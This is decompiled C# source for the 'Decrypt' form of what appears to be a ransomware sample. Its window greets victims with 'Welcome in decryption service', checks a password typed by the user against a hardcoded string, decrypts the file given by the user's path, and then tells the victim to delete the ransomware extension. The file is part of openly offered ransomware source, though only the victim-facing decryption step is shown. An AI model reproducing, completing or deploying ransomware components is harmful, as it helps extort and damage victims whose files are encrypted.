using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns2;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox4")]
	internal virtual TextBox TextBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox5")]
	internal virtual TextBox TextBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox6")]
	internal virtual TextBox TextBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form2()
	{
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_037e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0388: Expected O, but got Unknown
		Label1 = new Label();
		Button1 = new Button();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		TextBox4 = new TextBox();
		TextBox5 = new TextBox();
		TextBox6 = new TextBox();
		Label2 = new Label();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Label1).set_ForeColor(Color.Yellow);
		((Control)Label1).set_Location(new Point(255, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(229, 18));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Welcome in decryption service :D\r\n");
		((Control)Button1).set_Location(new Point(704, 415));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(75, 23));
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Decrypt");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)TextBox1).set_Location(new Point(127, 128));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(124, 20));
		((Control)TextBox1).set_TabIndex(2);
		((Control)TextBox1).set_Visible(false);
		((Control)TextBox2).set_Location(new Point(135, 136));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(100, 20));
		((Control)TextBox2).set_TabIndex(3);
		((Control)TextBox2).set_Visible(false);
		((Control)TextBox3).set_Location(new Point(143, 144));
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(100, 20));
		((Control)TextBox3).set_TabIndex(4);
		((Control)TextBox3).set_Visible(false);
		((Control)TextBox4).set_Location(new Point(679, 292));
		((Control)TextBox4).set_Name("TextBox4");
		((Control)TextBox4).set_Size(new Size(100, 20));
		((Control)TextBox4).set_TabIndex(5);
		((Control)TextBox4).set_Visible(false);
		((Control)TextBox5).set_Location(new Point(318, 235));
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(100, 20));
		((Control)TextBox5).set_TabIndex(6);
		((Control)TextBox5).set_Visible(false);
		((Control)TextBox6).set_Location(new Point(688, 364));
		((Control)TextBox6).set_Name("TextBox6");
		((Control)TextBox6).set_Size(new Size(100, 20));
		((Control)TextBox6).set_TabIndex(7);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Label2).set_ForeColor(Color.Yellow);
		((Control)Label2).set_Location(new Point(615, 363));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(67, 18));
		((Control)Label2).set_TabIndex(8);
		Label2.set_Text("File path:");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_Name("Form2");
		((Form)this).set_Text("Decrypt");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		string encryptedtext = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(TextBox6.get_Text());
		string text = Interaction.InputBox("Enter password: ", "", "", -1, -1);
		if (Operators.CompareString(text, "1234567890--=!@#$%^&*()_+][poiuytrewqQWERTYUIOP{}}|';lkjhgfdsaASDFGHJKL?><MNBVCXZzxcvbnm,./qwdasafasfdsgasgadhdjfgn", false) == 0)
		{
			Class1 @class = new Class1(text);
			try
			{
				string text2 = @class.DecryptData(encryptedtext);
				TextBox4.set_Text(text2);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(TextBox6.get_Text());
				StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(TextBox6.get_Text(), true);
				streamWriter.WriteLine(TextBox4.get_Text());
				streamWriter.Close();
				Interaction.MsgBox((object)"Success Decrypt Now You Can Delete Ransomware Extension", (MsgBoxStyle)0, (object)null);
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Interaction.MsgBox((object)"Can't decrypt", (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Interaction.MsgBox((object)"Wrong Path", (MsgBoxStyle)0, (object)null);
	}
}
